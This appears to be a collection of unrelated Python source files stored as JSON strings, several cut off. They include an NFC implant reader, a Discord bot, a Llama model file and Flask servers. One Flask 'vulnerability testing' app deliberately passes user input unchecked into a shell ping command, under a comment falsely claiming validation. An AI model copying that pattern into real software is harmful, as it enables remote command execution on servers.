    "#!/usr/bin/env python3\n#Sense-NET is a tool to interact with bioimplants (specially those manufactured by Dangerous Things)\n#Refer to the documentation for a list of compatible implants and devices\n#Mauro Eldritch @ DC5411 - 2024\n\nimport os, sys, platform, argparse, signal\nimport ndef\nfrom smartcard.CardMonitoring import CardMonitor, CardObserver\nfrom smartcard.util import toHexString\nfrom smartcard.CardConnection import CardConnection\nfrom termcolor import colored\n\n#Known manufacturers (RFID mode)\nKNOWN_MANUFACTURERS = {\n\t\"02\": \"STMicroelectronics\",\n\t\"04\": \"NXP Semiconductors\",\n\t\"07\": \"Texas Instruments\",\n\t\"08\": \"INSIDE Secure (INSIDE)\",\n\t\"0A\": \"Innovision Research\",\n\t\"1B\": \"Sony Corporation\",\n\t\"1C\": \"Infineon Technologies\",\n\t\"2E\": \"Broadcom\",\n\t\"3F\": \"Motorola\",\n\t\"44\": \"Atmel\",\n\t\"88\": \"Samsung Electronics\"\n}\n\n#Known chips (NFC mode)\nKNOWN_CHIPS = {\n\t\"00 01\": \"MIFARE Classic 1K\",\n\t\"00 38\": \"MIFARE Plus\u00ae SL2 2K\",\n\t\"00 02\": \"MIFARE Classic 4K\",\n\t\"00 39\": \"MIFARE Plus\u00ae SL2 4K\",\n\t\"00 03\": \"MIFARE Ultralight\u00ae\",\n\t\"00 26\": \"MIFARE Mini\u00ae\",\n\t\"00 3A\": \"MIFARE Ultralight\u00ae C\",\n\t\"00 36\": \"MIFARE Plus\u00ae SL1 2K\",\n\t\"00 37\": \"MIFARE Plus\u00ae SL1 4K\",\n}\n\n#Known standards (NFC mode)\nKNOWN_STANDARDS = {\n\t\"03\": \"ISO 14443A, Part 3\",\n\t\"11\": \"FeliCa\"\n}\n\n#Catch user's interruptions via SIGINT \ndef signal_handler(sig, frame):\n\tprintc(\"\\n[!] Detected Ctrl+C. Exiting...\", \"yellow\")\n\tsys.exit(0)\nsignal.signal(signal.SIGINT, signal_handler)\n\n#I miss Ruby's colorize gem\ndef printc(string, color, extras=None):\n\tif extras:\n\t\tprint(colored(string, color, attrs=[extras]))\n\telse:\n\t\tprint(colored(string, color))\n\n#Detect compatible readers and their available modes\ndef detect_reader_mode():\n\tos_type = platform.system()\n\tif os_type == \"Darwin\":\n\t\toutput = os.popen(\"system_profiler SPUSBDataType 2>/dev/null\").read()\n\t\tif \"Vendor ID: 0x08ff\" in output and \"Product ID: 0x0009\" in output:\n\t\t\treturn \"Dangerous Things RFID reader (Sycreader RFID Technology / AuthenTec).\", \"RFID\"\n\t\telif \"Vendor ID: 0x072f\" in output and \"Product ID: 0x223b\" in output:\n\t\t\treturn \"ACR1252 Dual Reader (ACS).\", \"NFC\"\n\t\telse:\n\t\t\treturn None, None\n\telif os_type in [\"Linux\", \"FreeBSD\", \"OpenBSD\", \"NetBSD\"]:\n\t\toutput = os.popen(\"lsusb\").read()\n\t\tif \"08ff:0009\" in output:\n\t\t\treturn \"Dangerous Things RFID reader (Sycreader RFID Technology / AuthenTec).\", \"RFID\"\n\t\telif \"072f:223b\" in output:\n\t\t\treturn \"ACR1252 Dual Reader (ACS).\", \"NFC\"\n\t\telse:\n\t\t\treturn None, None\n\telse:\n\t\tprintc(\"[!] Unsupported operating system.\", \"red\")\n\t\treturn None, None\n\n#RFID Mode\ndef rfid_menu():\n\toption = \"\"\n\twhile option != \"0\":\n\t\tprintc(\"RFID Menu\", \"blue\", \"underline\")\n\t\tprintc(\"[1] Get implant information\", \"blue\")\n\t\tprintc(\"[0] Exit\\n\", \"blue\")\n\t\toption = input(\"[>] \").strip()\n\t\tif option == \"1\":\n\t\t\tget_rfid_info()\n\t\telif option == \"0\":\n\t\t\tprintc(\"[*] Exiting.\", \"yellow\")\n\t\telse:\n\t\t\tprintc(\"[!] Invalid option. Press any key to continue.\", \"red\")\n\t\t\tinput()\n\t\tos.system(\"clear\")\n\t\t\ndef get_rfid_info():\n\tprintc(\"\\n[?] Please scan your implant using the RFID reader... \", \"blue\")\n\tbioimplant = input(\"[>] \").strip()\n\tif bioimplant and len(bioimplant) == 14:\n\t\tmanufacturer_byte = bioimplant[:2]\n\t\tidentifier = bioimplant[2:12]\n\t\tchecksum = bioimplant[12:]\n\t\tmanufacturer = KNOWN_MANUFACTURERS.get(manufacturer_byte, \"Unknown\")\n\t\tprintc(f\"\\n[*] Bioimplant UID:   {bioimplant}\", \"blue\", \"bold\")\n\t\tprintc(f\"[*] Manufacturer:     {manufacturer}\", \"blue\", \"bold\")\n\t\tprintc(f\"[*] Identifier:\t      {identifier}\", \"blue\", \"bold\")\n\t\tprintc(f\"[*] Checksum:\t      {checksum}\", \"blue\", \"bold\")\n\t\tprintc(\"\\n[?] Press any key to continue...\", \"blue\")\n\t\tinput()\n\telse:\n\t\tprintc(\"[!] Invalid data. Ensure the UID is 14 characters long.\", \"red\")\n\t\tinput()\n\n#NFC mode\ndef nfc_menu():\n\toption = \"\"\n\twhile option != \"0\":\n\t\tprintc(\"[*] NFC Menu\", \"blue\", \"underline\")\n\t\tprintc(\"[1] Get implant information\", \"blue\")\n\t\tprintc(\"[2] Read implant contents (NDEF)\", \"blue\")\n\t\tprintc(\"[3] Read implant contents (RAW)\", \"blue\")\n\t\tprintc(\"[4] Write implant content\", \"blue\")\n\t\tprintc(\"[0] Exit\\n\", \"blue\")\n\t\toption = input(\"[>] \").strip()\n\t\tif option == \"1\":\n\t\t\tstart_nfc_listener(\"info\")\n\t\telif option == \"2\":\n\t\t\tstart_nfc_listener(\"read\")\n\t\telif option == \"3\":\n\t\t\tstart_nfc_listener(\"raw\")\n\t\telif option == \"4\":\n\t\t\tprintc(\"\\n[?] Enter the NDEF message to be recorded on the implant: \", \"blue\")\n\t\t\tnew_ndef_message = input(\"[>] \").strip()\n\t\t\tstart_nfc_listener(\"write\", new_ndef_message)\n\t\telif option == \"0\":\n\t\t\tprintc(\"[*] Exiting.\", \"yellow\")\n\t\telse:\n\t\t\tprintc(\"[!] Invalid option. Press any key to continue.\", \"red\")\n\t\t\tinput()\n\t\tos.system(\"clear\")\n\n#Read RAW blocks\ndef read_raw_blocks(connection):\n\tread_command = [0xFF, 0xB0, 0x00, 0x00, 0x10]\n\tblock_number = 0\n\tmax_blocks = 48\n\ttry:\n\t\twhile block_number < max_blocks:\n\t\t\tresponse, sw1, sw2 = connection.transmit(read_command)\n\t\t\tif sw1 == 0x90 and sw2 == 0x00:\n\t\t\t\tblock_data = bytes(response)\n\t\t\t\tformatted_data = ' '.join([block_data.hex()[i:i+2] for i in range(0, len(block_data.hex()), 2)])\n\t\t\t\tprintc(f\"[*]",
    "from flask import Flask, request, render_template_string, abort\nimport sqlite3\nimport os\n\napp = Flask(__name__)\n\n# Initialize a persistent SQLite database (for demonstration purposes)\ndef init_db():\n    conn = sqlite3.connect('users.db')  # Persistent DB for testing\n    cursor = conn.cursor()\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS users (\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\n            username TEXT UNIQUE,\n            password TEXT\n        )\n    ''')\n    # Insert admin user only if it does not already exist\n    try:\n        cursor.execute(\"INSERT INTO users (username, password) VALUES (?, ?)\", ('test', 'test'))\n    except sqlite3.IntegrityError:\n        pass  # Ignore if the user already exists\n    conn.commit()\n    conn.close()\n\ninit_db()\n\n# Home Page\n@app.route('/')\ndef index():\n    return '''\n    <h1>Vulnerability Testing Page</h1>\n    <p>Choose a vulnerability to test:</p>\n    <ul>\n        <li><a href=\"/sql-injection\">SQL Injection</a></li>\n        <li><a href=\"/command-injection\">Command Injection</a></li>\n        <li><a href=\"/xss\">Cross-Site Scripting (XSS)</a></li>\n    </ul>\n    '''\n\n# SQL Injection Vulnerability\n@app.route('/sql-injection', methods=['GET', 'POST'])\ndef sql_injection():\n    message = ''\n    if request.method in ['POST', 'GET']:\n        username = request.form.get('username', '')\n        password = request.form.get('password', '')\n        \n        # Secure SQL query using parameterized queries\n        conn = sqlite3.connect('users.db')\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT * FROM users WHERE username = ? AND password = ?\", (username, password))\n        result = cursor.fetchall()\n        \n        if result:\n            message = \"Login successful!\"\n        else:\n            message = \"Invalid username or password.\"\n            \n        conn.close()\n\n    # Return the response with status code\n    return render_template_string('''\n    <h1>SQL Injection Vulnerability</h1>\n    <form method=\"post\">\n        <label for=\"username\">Username:</label>\n        <input type=\"text\" name=\"username\" id=\"username\" required><br>\n        <label for=\"password\">Password:</label>\n        <input type=\"password\" name=\"password\" id=\"password\" required><br>\n        <input type=\"submit\" value=\"Login\">\n    </form>\n    <p>{{ message }}</p>\n    ''', message=message)\n\n# Command Injection Vulnerability\n@app.route('/command-injection', methods=['GET', 'POST'])\ndef command_injection():\n    output = ''\n    if request.method == 'POST':\n        ip = request.form.get('ip', '')\n        \n        # Validate IP address before executing command\n        if ip:\n            command = f\"ping -c 1 {ip}\"\n            print(\"Executed Command:\", command)\n            output = os.popen(command).read()  # Vulnerable to Command Injection\n    \n    return '''\n    <h1>Command Injection Vulnerability</h1>\n    <form method=\"post\">\n        <label for=\"ip\">Enter IP Address:</label>\n        <input type=\"text\" name=\"ip\" id=\"ip\" required><br>\n        <input type=\"submit\" value=\"Ping\">\n    </form>\n    <pre>{}</pre>\n    '''.format(output)\n\n# Cross-Site Scripting (XSS) Vulnerability\n@app.route('/xss', methods=['GET', 'POST'])\ndef xss():\n    comment = ''\n    if request.method == 'POST':\n        comment = request.form.get('comment', '')\n        # Sanitize comment to prevent XSS\n        comment = comment.replace('<', '&lt;').replace('>', '&gt;')\n    \n    return '''\n    <h1>Cross-Site Scripting (XSS) Vulnerability</h1>\n    <form method=\"post\">\n        <label for=\"comment\">Enter Comment:</label><br>\n        <input type=\"text\" name=\"comment\" id=\"comment\" required><br>\n        <input type=\"submit\" value=\"Submit\">\n    </form>\n    <h3>Your Comment:</h3>\n    <p>{}</p>\n    '''.format(comment)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n",
    "# coding=utf-8\n# Copyright 2022 EleutherAI and the HuggingFace Inc. team. All rights reserved.\n#\n# This code is based on EleutherAI's GPT-NeoX library and the GPT-NeoX\n# and OPT implementations in this library. It has been modified from its\n# original forms to accommodate minor architectural differences compared\n# to GPT-NeoX and OPT used by the Meta AI team that trained the model.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nimport math\nfrom typing import List, Optional, Tuple, Union\n\nimport torch\nimport torch.nn.functional as F\nimport torch.utils.checkpoint\nfrom torch import nn\n\nfrom transformers.activations import ACT2FN\nfrom transformers.cache_utils import Cache, DynamicCache, StaticCache\nfrom transformers.generation import GenerationMixin\nfrom transformers.modeling_attn_mask_utils import AttentionMaskConverter\nfrom transformers.modeling_flash_attention_utils import _flash_attention_forward\nfrom transformers.modeling_outputs import (\n    BaseModelOutputWithPast,\n    CausalLMOutputWithPast,\n    QuestionAnsweringModelOutput,\n    SequenceClassifierOutputWithPast,\n    TokenClassifierOutput,\n)\nfrom transformers.modeling_rope_utils import ROPE_INIT_FUNCTIONS\nfrom transformers.modeling_utils import PreTrainedModel\nfrom transformers.pytorch_utils import ALL_LAYERNORM_LAYERS\nfrom transformers.utils import (\n    add_code_sample_docstrings,\n    add_start_docstrings,\n    add_start_docstrings_to_model_forward,\n    is_flash_attn_greater_or_equal_2_10,\n    logging,\n    replace_return_docstrings,\n)\nfrom .configuration_llama import LlamaConfig\n\n\nlogger = logging.get_logger(__name__)\n\n_CHECKPOINT_FOR_DOC = \"meta-llama/Llama-2-7b-hf\"\n_CONFIG_FOR_DOC = \"LlamaConfig\"\n\n\nclass LlamaRMSNorm(nn.Module):\n    def __init__(self, hidden_size, eps=1e-6):\n        \"\"\"\n        LlamaRMSNorm is equivalent to T5LayerNorm\n        \"\"\"\n        super().__init__()\n        self.weight = nn.Parameter(torch.ones(hidden_size))\n        self.variance_epsilon = eps\n\n    def forward(self, hidden_states):\n        input_dtype = hidden_states.dtype\n        hidden_states = hidden_states.to(torch.float32)\n        variance = hidden_states.pow(2).mean(-1, keepdim=True)\n        hidden_states = hidden_states * torch.rsqrt(variance + self.variance_epsilon)\n        return self.weight * hidden_states.to(input_dtype)\n\n    def extra_repr(self):\n        return f\"{tuple(self.weight.shape)}, eps={self.variance_epsilon}\"\n\n\nALL_LAYERNORM_LAYERS.append(LlamaRMSNorm)\n\n\nclass LlamaRotaryEmbedding(nn.Module):\n    def __init__(\n        self,\n        dim=None,\n        max_position_embeddings=2048,\n        base=10000,\n        device=None,\n        scaling_factor=1.0,\n        rope_type=\"default\",\n        config: Optional[LlamaConfig] = None,\n    ):\n        super().__init__()\n        # TODO (joao): remove the `if` below, only used for BC\n        self.rope_kwargs = {}\n        if config is None:\n            logger.warning_once(\n                \"`LlamaRotaryEmbedding` can now be fully parameterized by passing the model config through the \"\n                \"`config` argument. All other arguments will be removed in v4.46\"\n            )\n            self.rope_kwargs = {\n                \"rope_type\": rope_type,\n                \"factor\": scaling_factor,\n                \"dim\": dim,\n                \"base\": base,\n                \"max_position_embeddings\": max_position_embeddings,\n            }\n            self.rope_type = rope_type\n            self.max_seq_len_cached = max_position_embeddings\n            self.original_max_seq_len = max_position_embeddings\n        else:\n            # BC: \"rope_type\" was originally \"type\"\n            if config.rope_scaling is not None:\n                self.rope_type = config.rope_scaling.get(\"rope_type\", config.rope_scaling.get(\"type\"))\n            else:\n                self.rope_type = \"default\"\n            self.max_seq_len_cached = config.max_position_embeddings\n            self.original_max_seq_len = config.max_position_embeddings\n\n        self.config = config\n        self.rope_init_fn = ROPE_INIT_FUNCTIONS[self.rope_type]\n\n        inv_freq, self.attention_scaling = self.rope_init_fn(self.config, device, **self.rope_kwargs)\n        self.register_buffer(\"inv_freq\", inv_freq, persistent=False)\n        self.original_inv_freq = self.inv_freq\n\n    def _dynamic_frequency_update(self, position_ids, device):\n        \"\"\"\n        dynamic RoPE layers should recompute `inv_freq` in the following situations:\n        1 - growing beyond the cached sequence length (allow scaling)\n  ",
    "import websockets\nimport asyncio\nimport json\nimport base64\nfrom PIL import Image\nimport io\nimport numpy as np\nimport torch\nimport time\n\nclass ImageWebSocketOutput:\n    def __init__(self):\n        self.websocket = None\n        self.server_url = \"ws://localhost:3001\"\n        \n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\n                \"images\": (\"IMAGE\",),\n                \"prompt\": (\"STRING\", {\"default\": \"\"})\n            }\n        }\n    \n    RETURN_TYPES = ()\n    FUNCTION = \"send_image\"\n    OUTPUT_NODE = True\n    CATEGORY = \"ETN Nodes\"\n\n    async def send_ws_message(self, image_data, prompt):\n        try:\n            async with websockets.connect(self.server_url) as websocket:\n                message = {\n                    \"type\": \"image\",\n                    \"image\": image_data,\n                    \"prompt\": prompt,\n                    \"timestamp\": int(time.time() * 1000)\n                }\n                await websocket.send(json.dumps(message))\n                print(f\"Image sent successfully with prompt: {prompt}\")\n        except Exception as e:\n            print(f\"WebSocket\u53d1\u9001\u9519\u8bef: {str(e)}\")\n            import traceback\n            print(traceback.format_exc())\n\n    def send_image(self, images, prompt):\n        try:\n            # \u8f6c\u6362\u56fe\u50cf\u683c\u5f0f\n            image = images[0]\n            \n            # \u786e\u4fdd\u56fe\u50cf\u662fnumpy\u6570\u7ec4\n            if isinstance(image, torch.Tensor):\n                image = image.cpu().numpy()\n                \n            # \u786e\u4fdd\u503c\u57280-255\u8303\u56f4\u5185\n            if image.max() <= 1.0:\n                image = (image * 255).astype(np.uint8)\n            else:\n                image = image.astype(np.uint8)\n                \n            # \u8f6c\u6362\u4e3aPIL\u56fe\u50cf\n            pil_image = Image.fromarray(image)\n            \n            # \u8f6c\u6362\u4e3abase64\n            buffer = io.BytesIO()\n            pil_image.save(buffer, format=\"PNG\")\n            image_data = base64.b64encode(buffer.getvalue()).decode('utf-8')\n            \n            # \u53d1\u9001\u6570\u636e\n            asyncio.run(self.send_ws_message(image_data, prompt))\n            print(\"Image processed and sent via WebSocket\")\n            \n        except Exception as e:\n            print(f\"Error in send_image: {str(e)}\")\n            import traceback\n            print(traceback.format_exc())\n            \n        return ()\n\nNODE_CLASS_MAPPINGS = {\n    \"ImageWebSocketOutput\": ImageWebSocketOutput\n} ",
    "import discord\nimport random\nimport os\nimport pytz\nfrom discord import app_commands\nfrom discord.ext import commands\nfrom util.antispam import Antispam\nimport datetime\n\nimage_exts = [\".jpg\", \".png\", \".jpeg\", \".webp\", \".gif\"]\n\nclass Events(commands.Cog):\n    def __init__(self, bot: commands.Bot):\n        self.bot: commands.Bot = bot\n        self.last_message = {}\n        self.last_sent_from_bot = {}\n        self.last_sent = {}\n        self.blocklist = []\n    \n    @app_commands.command(name=\"execute\", description=\"Dev-Terminal\")\n    async def execute(self, interaction: discord.Interaction, input: str):\n        if interaction.user.id != 579111799794958377:\n            await interaction.response.send_message(\"Du hast keinen Zugriff auf diesen Befehl.\", ephemeral=True)\n            return\n        \n        arguments = input.split(\" \", maxsplit=3)\n        if len(arguments) >= 3:\n            arguments.pop(2)\n        print(arguments)\n        \n        match (arguments[0]):\n            case (\"clear\" | \"666\"): # Clears the current message in cache\n                self.last_message[interaction.guild.id] = {}\n                self.last_sent_from_bot[interaction.guild.id] = {}\n                self.last_sent[interaction.guild.id] = {}\n                await interaction.response.send_message(f\"Ich habe `{arguments[0]}` ausgef\u00fchrt.\", delete_after=10)\n            \n            case (\"block\"):\n                if len(arguments) < 2:\n                    await interaction.response.send_message(f\"Zu wenig Argumente um {arguments[0]} auszuf\u00fchren.\", delete_after=10)\n                    return\n                \n                user = self.bot.get_user(int(arguments[1]))\n                \n                if self.blocklist.count(user.id) != 0:\n                    await interaction.response.send_message(f\"Ich habe `{arguments[0]}` ausgef\u00fchrt. {user.name} ist nun geblockt.\", allowed_mentions=None, delete_after=10)\n                    return\n                \n                self.blocklist.append(user.id)\n                await interaction.response.send_message(f\"Ich habe `{arguments[0]}` ausgef\u00fchrt. {user.name} ist nun geblockt.\", allowed_mentions=None, delete_after=10)\n                \n            case (\"unblock\"):\n                if len(arguments) < 2:\n                    await interaction.response.send_message(f\"Zu wenig Argumente um {arguments[0]} auszuf\u00fchren.\", delete_after=10)\n                    return\n                \n                user = self.bot.get_user(int(arguments[1]))\n                self.blocklist.pop(self.blocklist.index(user.id))\n                \n                await interaction.response.send_message(f\"Ich habe `{arguments[0]}` ausgef\u00fchrt. {user.name} ist nun entblockt.\", allowed_mentions=None, delete_after=10)\n                \n            case (\"1337\"): # Cleans the attachmentsfolder\n                for server_dir in os.listdir(\"./attachments\"):\n                    if len(os.listdir(f\"./attachments/{server_dir}\")) == 0:\n                        os.rmdir(f\"./attachments/{server_dir}\")\n                        continue\n                        \n                    for channel_dir in os.listdir(f\"./attachments/{server_dir}\"):\n                        if len(os.listdir(f\"./attachments/{server_dir}/{channel_dir}\")) == 0:\n                            os.rmdir(f\"./attachments/{server_dir}/{channel_dir}\")\n                            continue\n                            \n                        for image_file in os.listdir(f\"./attachments/{server_dir}/{channel_dir}\"):\n                            os.remove(f\"./attachments/{server_dir}/{channel_dir}/{image_file}\")\n                            \n                        if len(os.listdir(f\"./attachments/{server_dir}/{channel_dir}\")) == 0:\n                            os.rmdir(f\"./attachments/{server_dir}/{channel_dir}\")\n                            continue\n                    \n                    if len(os.listdir(f\"./attachments/{server_dir}\")) == 0:\n                        os.rmdir(f\"./attachments/{server_dir}\")\n                        continue\n                await interaction.response.send_message(f\"Ich habe `{arguments[0]}` ausgef\u00fchrt.\", delete_after=10)\n                    \n            case (\"populate\"):\n                if not self.message_cache.get(interaction.channel.id):\n                    self.message_cache[interaction.channel.id] = []\n                self.message_cache[interaction.channel.id] = [message async for message in interaction.channel.history(limit=100)]\n                await interaction.response.send_message(f\"Ich habe `{arguments[0]}` ausgef\u00fchrt.\", delete_after=10)\n                    \n            case (_):\n                await interaction.response.send_message(f\"Ich konnte `{arguments[0]}` nicht zuordnen.\", delete_after=10)\n                return\n        \n    @commands.Cog.listener(name=\"on_message\")\n    async def snipe(self, message: discord.Message):\n        if message.author.bot:\n            return\n        \n        if message.guild is None:\n            return\n    \n  ",
    "def actualizar_producto(productos, precios, stock):\n    \"\"\"\n    Actualiza los datos de un producto existente.\n    \"\"\"\n    try:\n        id_actualizar = int(input(\"Ingrese el ID del producto a actualizar: \"))\n        if id_actualizar in productos:\n            print(\"Deje en blanco los campos que no desee actualizar.\")\n            nuevo_nombre = input(f\"Nombre actual ({productos[id_actualizar]}): \").strip()\n            nuevo_precio = input(f\"Precio actual ({precios[id_actualizar]}): \").strip()\n            nuevo_stock = input(f\"Stock actual ({stock[id_actualizar]}): \").strip()\n\n            if nuevo_nombre:\n                productos[id_actualizar] = nuevo_nombre\n            if nuevo_precio:\n                precios[id_actualizar] = float(nuevo_precio)\n            if nuevo_stock:\n                stock[id_actualizar] = int(nuevo_stock)\n\n            print(\"Producto actualizado exitosamente.\")\n        else:\n            print(\"Error: El ID ingresado no existe.\")\n    except ValueError:\n        print(\"Error: Aseg\u00farese de ingresar valores v\u00e1lidos.\")\n",
    "import json\nfrom typing import List\n\nfrom tqdm import tqdm\n\nfrom pyper.llm_api import make_llm_request\n\nfrom .. import model\nfrom ..prompt import general_prompt as prompt\nfrom .base_generator import BaseGenerator\n\n\nclass GeneralGenerator(BaseGenerator):\n    def __init__(self):\n        super().__init__()\n\n    def generate(\n        self,\n        discipline: str,\n        num_tasks: int,\n        max_subjects: int,\n        max_subtopics: int,\n        max_sessions: int,\n        num_questions: int,\n    ):\n        \"\"\"Generate tasks and answers for a given discipline.\n\n        Args:\n            discipline (str): The academic discipline to generate content for\n            num_tasks (int): Total number of tasks to generate\n            max_subjects (int): Maximum number of subjects to generate\n            max_subtopics (int): Maximum number of subtopics per subject\n            max_sessions (int): Maximum number of sessions per syllabus\n            num_questions (int): Number of questions to generate per batch\n\n        Returns:\n            tuple: A tuple containing (clean_tasks, answers) where:\n                - clean_tasks: List of deduplicated question tasks\n                - answers: List of corresponding answers for each task\n        \"\"\"\n        print(\"generating subjects...\")\n        subjects = self._generate_subject(\n            discipline=discipline,\n            max_subjects=max_subjects,\n            max_subtopics=max_subtopics,\n        )\n        print(\"generating syllabus...\")\n        syllabus = self._generate_syllabus(\n            subjects=subjects,\n            max_sessions=max_sessions,\n        )\n\n        clean_tasks = []\n        with tqdm(total=num_tasks) as pbar:\n            while len(clean_tasks) < num_tasks - 1:\n                print(\"generating questions...\")\n                try:\n                    q_res = self._generate_question_task(\n                        syllabus=syllabus,\n                        batch=num_questions,\n                        knowledge=False,\n                    )\n                except Exception:\n                    raise\n\n                clean_t = self._deduplicate_task(q_res)\n                clean_tasks.extend(clean_t)\n                pbar.update(len(clean_t))\n\n        print(\"generating answers...\")\n        answers = self._generate_answers(question_tasks=clean_tasks)\n\n        return self._build_dataset(clean_tasks, answers)\n\n    def _generate_subject(\n        self,\n        discipline: str,\n        max_subjects: int,\n        max_subtopics: int,\n    ):\n        \"\"\"Generate subjects for the discipline\"\"\"\n        encode_message = [\n            {\n                \"role\": \"system\",\n                \"content\": prompt.generate_subject.format(\n                    discipline=discipline,\n                    max_subjects=max_subjects,\n                    max_subtopics=max_subtopics,\n                ),\n            },\n            {\n                \"role\": \"user\",\n                \"content\": f\"generate comprehensive list of subjects in {discipline} following the system prompt closely\",\n            },\n        ]\n\n        res = make_llm_request(\n            messages=encode_message,\n            response_format=model.SubjectSchema,\n        )\n\n        return res\n\n    def _generate_syllabus(\n        self,\n        subjects: List,\n        max_sessions: int,\n    ) -> List:\n        \"\"\"Generate syllabus for each subject\"\"\"\n        syllabus = []\n        for s in subjects[\"subjects\"]:\n            subject = s[\"subject\"]\n            level = s[\"level\"]\n            subtopics = s[\"subtopics\"]\n\n            encode_message = [\n                {\n                    \"role\": \"system\",\n                    \"content\": prompt.generate_syllabus.format(\n                        subject=subject,\n                        level=level,\n                        subtopics=subtopics,\n                        max_sessions=max_sessions,\n                    ),\n                },\n                {\n                    \"role\": \"user\",\n                    \"content\": \"generate educational syllabus by following the system prompt closely\",\n                },\n            ]\n\n            syllabi = make_llm_request(\n                messages=encode_message,\n                response_format=model.SyllabusSchema,\n            )\n            syllabus.append(syllabi)\n\n        return syllabus\n\n    def _build_question_prompt(self, **kwargs):\n        \"\"\"General question prompt\"\"\"\n        return [\n            {\n                \"role\": \"system\",\n                \"content\": prompt.generate_question.format(\n                    session=kwargs[\"session\"],\n                    concepts=kwargs[\"concepts\"],\n                    batch=kwargs[\"batch\"],\n                    max_tokens=kwargs[\"max_tokens\"],\n                ),\n            },\n            {\n                \"role\": \"user\",\n                \"content\": \"generate homework questions based on the syllabus by following the system prompt closely\",\n            },\n        ]\n\n    def _build_answer_prompt(self, **kwargs):\n        \"",
    "\"\"\"\nFlask-based web application that provides endpoints for uploading and serving audio files.\n\nThis application allows users to upload audio files via a POST request, process the uploaded audio, \nand retrieve the processed audio via a GET request. The app supports cross-origin requests \nand stores uploaded files locally. It also returns a URL to access the uploaded file once it's processed.\n\nModules:\n    - Flask: Used for creating the web application and handling HTTP requests and responses.\n    - werkzeug.utils: Provides the secure_filename function to sanitize the filename before saving.\n    - flask_cors: Used to enable Cross-Origin Resource Sharing (CORS) to allow access from different origins.\n    - os: Used to interact with the file system for creating directories and file operations.\n    - main: Imported from the `main` module, processes the uploaded audio file.\n    - utils.helper: Imports the `get_ipv4_address` function to fetch the current IPv4 address of the server.\n\nConfiguration:\n    - The application stores uploaded audio files in a local folder, defined by the constant `UPLOAD_FOLDER`.\n    - The `UPLOAD_FOLDER` is created if it doesn't already exist.\n\nRoutes:\n1. /upload (POST):\n   - Accepts an audio file from the request and saves it to the server.\n   - If the file is successfully uploaded, the application processes the file using the `main` function.\n   - Returns a JSON response containing:\n     - `audio_url`: A URL to access the uploaded audio file.\n     - `content`: The processed content returned by the `main` function.\n   - Returns a 400 error if no file is provided or if the file is empty.\n   - Returns a 200 status on success.\n\n2. /uploads/<filename> (GET):\n   - Serves the audio file from the local server if it exists.\n   - If the file is not found, returns a 404 error.\n   - If serving the file fails, returns a 500 error with an error message.\n\nServer Configuration:\n    - The app runs on host '0.0.0.0' and listens on port 5000.\n    - Debug mode is enabled for development purposes.\n\nDependencies:\n    - Flask: For web framework.\n    - werkzeug: For secure file handling.\n    - flask_cors: For CORS support.\n    - os: For file operations.\n    - main: For processing audio content.\n    - utils.helper: For obtaining the server's IP address.\n\nExample Workflow:\n    1. The client sends a POST request with an audio file to the `/upload` route.\n    2. The server processes the file, saves it locally, and returns a URL to the audio file.\n    3. The client can then use the returned URL to retrieve the processed file using a GET request.\n\n\"\"\"\n\n# Import necessary modules\nfrom flask import Flask, request, send_file, jsonify\nfrom werkzeug.utils import secure_filename\nfrom flask_cors import CORS\nimport os\nfrom main import main\nfrom utils.helper import get_ipv4_address\n\napp = Flask(__name__)\n\nCORS(app, resources={r\"/*\": {\"origins\": \"*\"}})\n\nUPLOAD_FOLDER = './uploads'\nos.makedirs(UPLOAD_FOLDER, exist_ok=True)\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n# Define the route for uploading audio files\n@app.route('/upload', methods=['POST'])\ndef upload_audio():\n    \"\"\"\n    This route allows users to upload audio files.\n\n    Steps:\n    1. The user submits a POST request with a file.\n    2. The server checks if the file is provided and if it has a valid filename.\n    3. If valid, the file is saved to the specified upload folder.\n    4. The server processes the file (via the `main` function) and generates a content result.\n    5. The server returns a JSON response containing:\n        - The URL where the uploaded audio file can be accessed.\n        - The content generated from the file.\n    \n    Returns:\n        - JSON response with `audio_url` and `content` if successful.\n        - 400 error with a message if the file is missing or invalid.\n    \"\"\"\n    if 'file' not in request.files:\n        return jsonify({\"error\": \"No file part\"}), 400\n    file = request.files['file']\n    if file.filename == '':\n        return jsonify({\"error\": \"No selected file\"}), 400\n    if file:\n        filename = secure_filename(file.filename)\n        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n        file.save(filepath)\n        content = main(filepath)\n        audio_url = f\"http://{get_ipv4_address()}:5000/uploads/{filename}\"\n        return jsonify({\"audio_url\": audio_url, \"content\": content}), 200\n\n# Define the route for serving audio files\n@app.route('/uploads/<filename>', methods=['GET'])\ndef serve_file(filename):\n    \"\"\"\n    This route serves the uploaded audio files to the user.\n\n    Steps:\n    1. The user sends a GET request for a specific file.\n    2. The server checks if the requested file exists in the upload folder.\n    3. If the file is found, it is served with the appropriate MIME type for audio files.\n    4. If the file does not exist or there is an error, the server returns an error message.\n    \n    Args:\n        filename (str): The name of the file to be served.\n\n    Returns:\n        - The audio file if found",
